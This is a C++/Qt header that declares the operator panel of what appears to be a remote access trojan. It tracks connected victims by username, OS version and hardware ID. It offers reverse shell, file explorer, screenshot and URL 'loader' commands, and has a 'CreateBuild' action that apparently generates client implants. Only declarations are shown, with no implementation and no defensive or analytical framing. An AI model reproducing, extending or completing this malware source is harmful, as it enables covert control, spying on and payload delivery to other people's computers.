#ifndef MWINDOW_H
#define MWINDOW_H

#include <QMainWindow>
#include <QMessageBox>
#include <QWidget>
#include <QThread>
#include "sqlite3.h"
#include "winsock.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

QT_BEGIN_NAMESPACE
namespace Ui { class MWindow; class Explorer; class ScreenShot; }
QT_END_NAMESPACE

class WSocket  : public QObject
{
    Q_OBJECT
private:
    enum {
        CMD_HADSHAKE,
        CMD_ONLINE,
        CMD_OTVET_OK,
        CMD_OTVET_ER,
        CMD_SCREEN,
        CMD_LOADER,
        CMD_SHELL
    };

    typedef struct CLIENTS
    {
        SOCKET SOCKET;
        char USERNAME[100];
        char OSVER[100];
        char HWID[100];
    } CLIENTS;

    typedef struct DLE
    {
        char URL[1000];
    } DLE;

    typedef struct BIGSCREEN
    {
        int w;
        int h;
        ULONG ZipSize;
    } BIGSCREEN;

    typedef struct CMDiDATA
    {
        DWORD CMD;
        char DATA[1000];
    } CMDiDATA;

    typedef NTSTATUS(NTAPI *fRtlDecompressBuffer)
    (
        USHORT CompressionFormat,
        PUCHAR UncompressedBuffer,
        ULONG  UncompressedBufferSize,
        PUCHAR CompressedBuffer,
        ULONG  CompressedBufferSize,
        PULONG FinalUncompressedSize
    );

    typedef NTSTATUS(WINAPI* fRtlGetCompressionWorkSpaceSize)
    (
        USHORT CompressionFormatAndEngine,
        PULONG CompressBufferWorkSpaceSize,
        PULONG CompressFragmentWorkSpaceSize
    );

    typedef NTSTATUS(WINAPI* fRtlCompressBuffer)
    (
        USHORT CompressionFormatAndEngine,
        PUCHAR UncompressedBuffer,
        ULONG  UncompressedBufferSize,
        PUCHAR CompressedBuffer,
        ULONG  CompressedBufferSize,
        ULONG  UncompressedChunkSize,
        PULONG FinalCompressedSize,
        PVOID  WorkSpace
    );

    int LisPort;

    HMODULE ntdll = NULL;
    fRtlGetCompressionWorkSpaceSize pRtlGetCompressionWorkSpaceSize = NULL;
    fRtlCompressBuffer pRtlCompressBuffer = NULL;
    fRtlDecompressBuffer pRtlDecompressBuffer = NULL;

    void InitArchiveFunc();

    BYTE *Decompress(BYTE *compBuffer, \
                     const int compBufferLen, \
                     const int uncompBufferLen, \
                     DWORD *uncompBufferSize);
    BYTE *Compress(BYTE *uncompBuffer, \
                   const DWORD uncompBufferLen, \
                   DWORD compBufferLen, \
                   DWORD *compBufferSize);

    WINBOOL sendInt(SOCKET con, int i);
    WINBOOL recvStat(SOCKET Con);
public:
    SOCKET ListenSocket;
    WSocket(int Port);

public slots:
    void ReversCmd(int NOMER);
    void WaitClient();
    void WaitShell(int NOMER);
    void CheckOnline();

signals:
    void AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER);
    void DelClient(int NOMER);
    void CloseShell();
};

class ScreenShot : public QWidget
{
    Q_OBJECT

public:
    explicit ScreenShot(QWidget *parent = nullptr);
    ~ScreenShot();

private:
    Ui::ScreenShot *ui;
};

class Explorer : public QWidget
{
    Q_OBJECT

public:
    explicit Explorer(QWidget *parent = nullptr);
    ~Explorer();

private:
    Ui::Explorer *ui;
};

class MWindow : public QMainWindow
{
    Q_OBJECT

public:
    MWindow(QWidget *parent = nullptr);
    ~MWindow();
    WSocket *wsocket80, *servHandl, *shellSocket;
    QThread *mainSocketThread, *shellSocketThread;

public slots:
    void sOpenMenu(QPoint pos);
    void sRunShell();
    void sExplorer();
    void sScreen();
    void sLoader();
    void AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER);
    void DelClient(int NOMER);
    void CloseShell();

private slots:
    void on_CreateBuild_triggered();
    void on_AddPorts_triggered();
    void on_OpenBD_triggered();
    void on_OnlineRecv_triggered();

signals:
    void ReversCmd(int NOMER);
    void WaitClient();
    void WaitShell(int NOMER);
    void CheckOnline();

private:
    QMenu *menu;
    QAction *Revershell;
    QAction *Explorer;
    QAction *ScreenShot;
    QAction *Loader;
    Ui::MWindow *ui;
};
#endif // MWINDOW_H
